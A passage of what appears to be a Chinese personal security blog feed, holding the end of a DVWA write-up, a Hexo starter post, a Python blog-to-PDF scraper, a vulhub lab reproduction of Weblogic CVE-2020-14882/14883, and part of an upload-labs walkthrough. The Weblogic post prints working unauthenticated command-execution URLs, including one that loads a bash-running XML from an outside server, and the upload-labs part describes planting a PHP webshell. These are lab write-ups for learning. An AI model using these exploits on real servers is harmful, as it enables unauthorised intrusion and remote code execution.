<p> 几个函数调用顺序及生成token的步骤如下：<br> 1、执行token_part_1()，取phrase值并进行字符串翻转处理；<br> 2、延迟300ms后执行token_part_2()，传入参数字符串’XX’和token值拼接并调用sha256()加密；<br> 3、点击按钮时执行token_part_3()，将token值和字符串’ZZ’拼接并调用sha256()加密，从而得到最终的token；</p>
<p>sha256(sha256(“XX”+”sseccus”)+”ZZ”)</p>
<p>得到token -&gt;   ec7ef8687050b6fe803867ea696734c67b541dfafb286a0b1239f42ac5b0aa84<br> <img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081051183.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">​</p>
<p>抓包修改 token phrase ，提交 </p>
<p> <img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081051590.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>well done ! </p>
<p><img src="https://img-blog.csdnimg.cn/cb2a5babc192426090413ab3b3018c1d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARXJZYW83,size_12,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h2 id="Security-level-is-currently-impossible-11"><a href="#Security-level-is-currently-impossible-11" class="headerlink" title="Security level is currently: impossible."></a>Security level is currently: <em>impossible</em>.</h2><p>你不能相信任何来自用户的东西，也不能阻止他们篡改，所以没有不可能的关卡。</p>
<p>感谢各位大佬的文章，学习到了很多~</p>
<p>DVWA完结~</p>
<p>撒花~</p>
]]></content>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2021/11/03/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<span id="more"></span>

<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>python爬虫-爬取github博客文章并存储为PDF</title>
    <url>/2022/01/01/python%E7%88%AC%E8%99%AB-%E7%88%AC%E5%8F%96github%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0%E5%B9%B6%E5%AD%98%E5%82%A8%E4%B8%BAPDF/</url>
    <content><![CDATA[<p>目标页面：</p>
<p>​    <a href="https://yanmie-art.github.io/tags/">https://yanmie-art.github.io/tags/</a></p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202201012223104.png" alt="image-20220101222342804"></p>
<p>我们需要用到的库：</p>
<p>​    <code>import pdfkit</code> </p>
<p>​    <code>import requests</code> </p>
<p>​    <code>import parsel</code></p>
<p>相关模块可pip安装</p>
<h1 id="分析页面结构"><a href="#分析页面结构" class="headerlink" title="分析页面结构"></a>分析页面结构</h1><p>大概浏览以下页面，tags页面中包含了所有文章，不存在分页情况，这样就省去一步了。</p>
<p>F12打开开发者工具，查看页面源码，我们看到一个标签列表。</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202201012244773.png" alt="image-20220101224434586"></p>
<p>打开列表中的一个就会发现，该标签下的文章。</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202201012248611.png" alt="image-20220101224840417"></p>
<p>ctrl + shift +c ,选择 tags 页面中的文章标题 ”使用github个人博客“，我们看到了文章标题，链接以及class。</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202201012235358.png" alt="image-20220101223527135"></p>
<p>但是这里的链接只有后半部分，所以我们需要自己补全url</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202201012237175.png" alt="image-20220101223721126"></p>
<h1 id="爬取每一篇文章的URL"><a href="#爬取每一篇文章的URL" class="headerlink" title="爬取每一篇文章的URL"></a>爬取每一篇文章的URL</h1><h2 id="实现代码"><a href="#实现代码" class="headerlink" title="实现代码"></a>实现代码</h2><p>这里需要掌握 css选择器。（本人是初学者，所以下面内容如果存在错误之处，欢迎指出！）</p>
<p>需要注意的是，当页面结构发生改变时，css选择器对应的代码就要改变！</p>
<p>经过分析 文章的url 属于 post-preview 类，且位于a标签中，所以提取href的内容</p>
<p><code>selector.css(&#39;.post-preview a ::attr(href)&#39;).getall()</code></p>
<p>源码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pdfkit</span><br><span class="line"><span class="keyword">import</span> parsel</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标url</span></span><br><span class="line">url = <span class="string">&quot;https://yanmie-art.github.io/tags/&quot;</span></span><br><span class="line"><span class="comment"># 文章url 前缀</span></span><br><span class="line">url0 = <span class="string">&quot;https://yanmie-art.github.io&quot;</span></span><br><span class="line"></span><br><span class="line">response = requests.get(url=url)</span><br><span class="line"><span class="comment"># 将网页变成选择器</span></span><br><span class="line">selector = parsel.Selector(response.text)</span><br><span class="line"><span class="comment"># 爬取每篇文章的url（不完整）</span></span><br><span class="line">urls1 = selector.css(<span class="string">&#x27;.post-preview a ::attr(href)&#x27;</span>).getall()</span><br><span class="line"><span class="comment"># 爬取每篇文章的title</span></span><br><span class="line"><span class="comment"># titles = selector.css(&#x27;.post-title::text&#x27;).getall()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> url1 <span class="keyword">in</span> urls1:</span><br><span class="line">    <span class="comment"># 补全文章url</span></span><br><span class="line">    article_url = url0 + url1</span><br><span class="line">    <span class="comment"># 打印验证</span></span><br><span class="line">    <span class="built_in">print</span>(article_url)</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202201012251185.png" alt="image-20220101225152013"></p>
<h1 id="爬取文章标题以及内容"><a href="#爬取文章标题以及内容" class="headerlink" title="爬取文章标题以及内容"></a>爬取文章标题以及内容</h1><p>爬取到每一篇文章的URL后，我们爬出每篇文章的标题和内容</p>
<p>同样分析页面结构，获得标题位置和内容位置</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202201012256819.png" alt="image-20220101225606667"></p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202201012313515.png" alt="image-20220101231334383"></p>
<p>对于标题和内容的提取解析，同样使用css选择器，下面直接附上源码：</p>
<h2 id="实现代码："><a href="#实现代码：" class="headerlink" title="实现代码："></a>实现代码：</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pdfkit</span><br><span class="line"><span class="keyword">import</span> parsel</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标url</span></span><br><span class="line">url = <span class="string">&quot;https://yanmie-art.github.io/tags/&quot;</span></span><br><span class="line"><span class="comment"># 文章url 前缀</span></span><br><span class="line">url0 = <span class="string">&quot;https://yanmie-art.github.io&quot;</span></span><br><span class="line"></span><br><span class="line">response = requests.get(url=url)</span><br><span class="line"><span class="comment"># 将网页变成选择器</span></span><br><span class="line">selector = parsel.Selector(response.text)</span><br><span class="line"><span class="comment"># 爬取每篇文章的url（不完整）</span></span><br><span class="line">urls1 = selector.css(<span class="string">&#x27;.post-preview a ::attr(href)&#x27;</span>).getall()</span><br><span class="line"><span class="comment"># 爬取每篇文章的title</span></span><br><span class="line"><span class="comment"># titles = selector.css(&#x27;.post-title::text&#x27;).getall()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> url1 <span class="keyword">in</span> urls1:</span><br><span class="line">    <span class="comment"># 补全文章url</span></span><br><span class="line">    article_url = url0 + url1</span><br><span class="line">    <span class="comment"># print(article_url)</span></span><br><span class="line">    <span class="comment"># 请求文章url</span></span><br><span class="line">    response = requests.get(url=article_url)</span><br><span class="line">    selector = parsel.Selector(response.text)</span><br><span class="line">    <span class="comment"># 获取文章标题,class=&quot;post-heading&quot;,h1标签,获取text</span></span><br><span class="line">    title = selector.css(<span class="string">&#x27;.post-heading h1 ::text&#x27;</span>).getall()</span><br><span class="line">    <span class="comment"># 过滤文章标题中不合法的字符，保证以文章标题为名存储为PDF时不报错</span></span><br><span class="line">    title = title[<span class="number">0</span>]</span><br><span class="line">    title = title.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    title = title.replace(<span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    title = title.replace(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    title = title.replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    title = title.replace(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    title = title.replace(<span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="comment"># 获取文章内容</span></span><br><span class="line">    content = selector.css(<span class="string">&#x27;.post-container&#x27;</span>).get()</span><br><span class="line">    <span class="comment"># 打印验证</span></span><br><span class="line">    <span class="built_in">print</span>(title)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;*&quot;</span>*<span class="number">40</span>)</span><br><span class="line">    <span class="built_in">print</span>(content)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;*&quot;</span>*<span class="number">40</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202201012309360.png" alt="image-20220101230943222"></p>
<h1 id="以标题名存储为PDF格式"><a href="#以标题名存储为PDF格式" class="headerlink" title="以标题名存储为PDF格式"></a>以标题名存储为PDF格式</h1><p>现在所看到的返回的内容结果，除了标题是咱们需要的那样，但是内容还是网页数据。</p>
<p>咱们只需要把html改成PDF格式</p>
<h2 id="wkhtmltopdf-exe-工具"><a href="#wkhtmltopdf-exe-工具" class="headerlink" title="wkhtmltopdf.exe 工具"></a><a href="https://wkhtmltopdf.org/downloads.html">wkhtmltopdf.exe</a> 工具</h2><p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202201012317897.png" alt="image-20220101231739762"></p>
<p>有了这个小工具就可以将html格式改为PDF格式，直接上源码</p>
<h2 id="完整代码："><a href="#完整代码：" class="headerlink" title="完整代码："></a>完整代码：</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pdfkit</span><br><span class="line"><span class="keyword">import</span> parsel</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标url</span></span><br><span class="line">url = <span class="string">&quot;https://yanmie-art.github.io/tags/&quot;</span></span><br><span class="line"><span class="comment"># 文章url 前缀</span></span><br><span class="line">url0 = <span class="string">&quot;https://yanmie-art.github.io&quot;</span></span><br><span class="line"></span><br><span class="line">html_str = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;!doctype html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;en&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Document&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">&#123;article&#125;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">response = requests.get(url=url)</span><br><span class="line"><span class="comment"># 将网页变成选择器</span></span><br><span class="line">selector = parsel.Selector(response.text)</span><br><span class="line"><span class="comment"># 爬取每篇文章的url（不完整）</span></span><br><span class="line">urls1 = selector.css(<span class="string">&#x27;.post-preview a ::attr(href)&#x27;</span>).getall()</span><br><span class="line"><span class="comment"># 爬取每篇文章的title</span></span><br><span class="line"><span class="comment"># titles = selector.css(&#x27;.post-title::text&#x27;).getall()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> url1 <span class="keyword">in</span> urls1:</span><br><span class="line">    <span class="comment"># 补全文章url</span></span><br><span class="line">    article_url = url0 + url1</span><br><span class="line">    <span class="comment"># print(article_url)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 请求文章url</span></span><br><span class="line">    response = requests.get(url=article_url)</span><br><span class="line">    selector = parsel.Selector(response.text)</span><br><span class="line">    <span class="comment"># 获取文章标题,class=&quot;post-heading&quot;,h1标签,获取text</span></span><br><span class="line">    title = selector.css(<span class="string">&#x27;.post-heading h1 ::text&#x27;</span>).getall()</span><br><span class="line">    <span class="comment"># 过滤标题的非法字符，保证以标题名存储时正确</span></span><br><span class="line">    title = title[<span class="number">0</span>]</span><br><span class="line">    title = title.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    title = title.replace(<span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    title = title.replace(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    title = title.replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    title = title.replace(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    title = title.replace(<span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="comment"># 获取文章内容</span></span><br><span class="line">    content = selector.css(<span class="string">&#x27;.post-container&#x27;</span>).get()</span><br><span class="line">    <span class="comment"># 打印验证</span></span><br><span class="line">    <span class="comment"># print(title)</span></span><br><span class="line">    <span class="comment"># print(content)</span></span><br><span class="line">    <span class="comment"># print(&quot;*&quot;*40)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 转换格式</span></span><br><span class="line">    html = html_str.<span class="built_in">format</span>(article=content)</span><br><span class="line">    <span class="comment"># 写入html文件</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&#x27;<span class="subst">&#123;title&#125;</span>.html&#x27;</span>, mode=<span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(html)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#123;&#125;已下载完成&#x27;</span>.<span class="built_in">format</span>(title))</span><br><span class="line">    <span class="comment"># exe 文件存放的路径</span></span><br><span class="line">    config = pdfkit.configuration(wkhtmltopdf=<span class="string">&#x27;D:\\wkhtmltox\\wkhtmltopdf\\bin\\wkhtmltopdf.exe&#x27;</span>)</span><br><span class="line">    <span class="comment"># 报错：由于网络错误，以代码 1 退出：ProtocolUnknownError</span></span><br><span class="line">    <span class="comment"># 解决方法：https://githubmate.com/repo/HAKSOAT/EpubToPdf/issues/3</span></span><br><span class="line">    options = &#123;</span><br><span class="line">        <span class="string">&quot;enable-local-file-access&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">        <span class="string">&quot;quiet&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 把 html 通过 pdfkit 变成 pdf 文件</span></span><br><span class="line">    pdfkit.from_file(<span class="string">f&#x27;<span class="subst">&#123;title&#125;</span>.html&#x27;</span>, <span class="string">f&#x27;<span class="subst">&#123;title&#125;</span>.pdf&#x27;</span>, configuration=config, options=options)</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202201012327398.png" alt="image-20220101232735213"></p>
]]></content>
  </entry>
  <entry>
    <title>vulhub漏洞-—Weblogic管理控制台未授权远程命令执行漏洞（CVE-2020-14882，CVE-2020-14883）</title>
    <url>/2021/12/20/vulhub%E6%BC%8F%E6%B4%9E-%E2%80%94Weblogic%E7%AE%A1%E7%90%86%E6%8E%A7%E5%88%B6%E5%8F%B0%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-14882%EF%BC%8CCVE-2020-14883%EF%BC%89/</url>
    <content><![CDATA[<p>Weblogic是Oracle公司推出的J2EE应用服务器。在2020年10月的更新中，Oracle官方修复了两个长亭科技安全研究员@voidfyoo 提交的安全漏洞，分别是CVE-2020-14882和CVE-2020-14883。</p>
<p>CVE-2020-14882允许未授权的用户绕过管理控制台的权限验证访问后台，CVE-2020-14883允许后台任意用户通过HTTP协议执行任意命令。使用这两个漏洞组成的利用链，可通过一个GET请求在远程Weblogic服务器上以未授权的任意用户身份执行命令。</p>
<h1 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h1><p>vulhub : <a href="https://github.com/vulhub/vulhub/blob/master/weblogic/CVE-2020-14882/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/weblogic/CVE-2020-14882/README.zh-cn.md</a></p>
<p>执行如下命令启动一个Weblogic 12.2.1.3版本的服务器：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<p>启动完成后，访问<code>http://your-ip:7001/console</code>即可查看到后台登录页面。</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112201145654.png" alt="image-20211220114504452"></p>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>首先通过CVE-2020-14882的权限绕过漏洞，未授权访问后台管理页面，通过以下URL访问</p>
<p><code>http://ip:7001/console/css/%252e%252e%252fconsole.portal</code></p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112201148933.png" alt="image-20211220114843815"></p>
<p>然后通过CVE-2020-14883来执行任意代码执行</p>
<p>CVE-2020-14883有两种利用方法一是通过<code>com.tangosol.coherence.mvel2.sh.ShellSession</code>，二是通过<code>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</code></p>
<h2 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h2><p>com.tangosol.coherence.mvel2.sh.ShellSession方法直接访问以下构造的URL即可利用</p>
<p><code>http://ip:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(&quot;java.lang.Runtime.getRuntime().exec(&#39;touch%20/tmp/EDI&#39;);&quot;)</code></p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112201204649.png" alt="image-20211220120421513"></p>
<p>进入docker容器就会发现创建的文件<del>，这里靶机是同学搭的就不再放截图了</del></p>
<p>这个利用方法只能在Weblogic 12.2.1以上版本利用，因为10.3.6并不存在<code>com.tangosol.coherence.mvel2.sh.ShellSession</code>类。</p>
<h2 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h2><p>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext方法通用所有</p>
<p>我们需要构建一个xml文件，将其保存在weblogic能访问的服务器上:ip(这里使用的是我自己的服务器):8000/test.xml:</p>
<p>test.xml</p>
<p><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</code><br><code>&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;    xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;    xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;</code><br>    <code>&lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot; init-method=&quot;start&quot;&gt;</code><br>        <code>&lt;constructor-arg&gt;</code><br>          <code>&lt;list&gt;</code><br>            <code>&lt;value&gt;bash&lt;/value&gt;</code><br>            <code>&lt;value&gt;-c&lt;/value&gt;</code><br>            <code>&lt;value&gt;&lt;![CDATA[touch /tmp/success2]]&gt;&lt;/value&gt;</code><br>          <code>&lt;/list&gt;</code><br>        <code>&lt;/constructor-arg&gt;</code><br>    <code>&lt;/bean&gt;</code><br><code>&lt;/beans&gt;</code></p>
<p>通过<a href="https://so.csdn.net/so/search?from=pc_blog_highlight&q=python">python</a>3 -m http.server命令放到外网环境中,默认监听端口8000。</p>
<p><code>python3 -m http.server</code> </p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112201215176.png" alt="image-20211220121525132"></p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112201225526.png" alt="image-20211220122558429"></p>
<p>构造URL即可利用</p>
<p><code>http://your-ip:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&quot;http://ip:8000/test.xml&quot;)</code></p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112201224023.png" alt="image-20211220122413890"></p>
<p>同样进入容器，就可以看到创建的文件夹！</p>
]]></content>
  </entry>
  <entry>
    <title>upload-labs通关详解</title>
    <url>/2021/11/11/upload-labs%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<p> <strong>目录</strong></p>
<p>[Pass-01 前端js验证](#Pass-01 前端js验证)</p>
<p>[Pass-02 后端MIME验证](#Pass-02 后端MIME验证)</p>
<p>[Pass-03 黑名单验证](#Pass-03 黑名单验证)</p>
<p>[Pass-04 黑名单验证.htaccess](#Pass-04 黑名单验证.htaccess)</p>
<p><a href="#Pass-05%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87">Pass-05大小写绕过</a></p>
<p>[Pass-6 空格绕过](#Pass-6 空格绕过)</p>
<p>[Pass-07 点绕过](#Pass-07 点绕过)</p>
<p>[Pass-08 ::$DATA绕过](#Pass-08 ::$DATA绕过)</p>
<p>[Pass-09 点+空格+点+空格绕过](#Pass-09 点+空格+点+空格绕过)</p>
<p>[Pass-10 双写绕过](#Pass-10 双写绕过)</p>
<p>[ Pass-11 00截断](# Pass-11 00截断)</p>
<p>[Pass-12 00截断](#Pass-12 00截断)</p>
<p>[Pass-13 图片马绕过](#Pass-13 图片马绕过)</p>
<p>[Pass-14 getimagesize()-图片马](#Pass-14 getimagesize()-图片马)</p>
<p><a href="#Pass-15">Pass-15</a></p>
<p>[Pass-16 二次渲染绕过](#Pass-16 二次渲染绕过)</p>
<p>[Pass-17 条件竞争](#Pass-17 条件竞争)</p>
<p><a href="#Pass-18">Pass-18</a></p>
<p>[Pass-19 00截断](#Pass-19 00截断)</p>
<p><a href="#Pass-20">Pass-20</a></p>
<p><a href="#%E5%A4%87%E6%B3%A8">备注</a></p>
<hr>
<span id="more"></span>

<h1 id="Pass-01-前端js验证"><a href="#Pass-01-前端js验证" class="headerlink" title="Pass-01 前端js验证"></a>Pass-01 前端js验证</h1><p>尝试上传.php文件，提示不成功。只能上传图片类型的文件。 </p>
<p><img src="https://img-blog.csdnimg.cn/e56378ac0f58486eabe7a9b5c7d8aced.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>分析原因：是因为前端js拦截了，我们先将php文件后缀修改成合法的格式（.gif ），在使用burpsuite抓包，再修改.php后缀。</p>
<p><img src="https://img-blog.csdnimg.cn/74a110d5df684a34b3410576264c7b08.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>我们可以再upload的相应包中看一下我们是否将文件上传成功了。</p>
<p>可以看到我们成功的将一句话木马上传至靶场的服务器。</p>
<p>POST[] 中是自己的密码。</p>
<p><img src="https://img-blog.csdnimg.cn/1857c957f2734623bf324cc86c317e70.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>到这里以及成功了，我们可以尝试使用蚁剑连接。</p>
<p><img src="https://img-blog.csdnimg.cn/4ee9198e11a44a4182586168ad069987.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/2584aaca7c8147e69656df9d3739f556.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="Pass-02-后端MIME验证"><a href="#Pass-02-后端MIME验证" class="headerlink" title="Pass-02 后端MIME验证"></a>Pass-02 后端MIME验证</h1><p>补充知识：</p>
<p>Content-Type 实体头部用于指示资源的MIME类型</p>
<p>media type ,在响应中，Content-Type标头告诉客户端实际返回的内容的内容类型。</p>
<p>第一步还是尝试上传php文件</p>
<p><img src="https://img-blog.csdnimg.cn/99daaeb5cd0f44b69589614d28077bde.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>发现与第一关的提示不同，不是根据文件的后缀进行识别。</p>
<p>分析源码：</p>
<p><img src="https://img-blog.csdnimg.cn/df8ea76283954463b00e6312109c512e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>发现这关只是对 content-type进行判断，在burp suite中，修改content-type为允许的类型就行了。</p>
<p>修改content-type</p>
<p><img src="https://img-blog.csdnimg.cn/4d889ab20d4346eea055e444fc1a6fe0.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>上传成功。同时蚁剑也可以连接成功！</p>
